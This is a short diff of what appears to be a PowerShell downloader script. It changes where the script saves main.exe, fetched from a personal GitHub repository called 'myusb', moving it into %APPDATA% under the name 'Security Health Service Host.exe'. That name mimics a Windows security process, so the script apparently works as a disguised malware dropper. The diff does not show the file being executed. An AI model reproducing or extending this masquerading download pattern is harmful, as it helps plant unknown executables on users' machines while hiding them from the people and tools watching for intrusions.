@@ -10,4 +10,4 @@ function Download($from, $to) {
     }
 }
 
-download https://raw.githubusercontent.com/MitrichevGeorge/myusb/main/main.exe "Security Health Service Host.exe"
+download https://raw.githubusercontent.com/MitrichevGeorge/myusb/main/main.exe "%APPDATA%\YourAppName\Security Health Service Host.exe"
